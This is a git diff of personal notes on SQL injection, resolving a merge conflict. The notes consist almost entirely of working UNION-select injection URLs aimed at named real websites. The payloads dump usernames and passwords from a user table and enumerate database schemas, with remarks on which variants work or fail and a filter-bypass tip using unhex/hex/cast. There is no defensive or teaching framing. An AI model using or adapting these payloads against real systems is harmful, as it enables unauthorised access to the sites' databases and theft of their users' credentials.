@@ -27,7 +27,7 @@ anaylize:
 good:
 http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
 fail:(without unhex(Hex()))
-<<<<<<< HEAD
+
 http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,cast(name as char),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
 
 
@@ -35,4 +35,5 @@ http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x2
 1.http://www.xxme.me/wordpress/341.html
 =======
 http://shi.hkbu.edu.hk/en/page.php?id=-29 union select 1,2,group_concat(0x7e,0x27,cast(name as char),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user
->>>>>>> 9a679509e551f014f0d31a7af78f291cc15ec32e
+
+bypass:http://lingcat.net/index.php?s_ID=-4' union select 1,2,3,4,group_concat(unhex(Hex(cast(schema_name as char)))),6,7,8,9,10,11,12 from information_schema.schemata-- -(# or -- are both not ok,meanwhile,unhex.hex.cast(xx as char) is very important too)
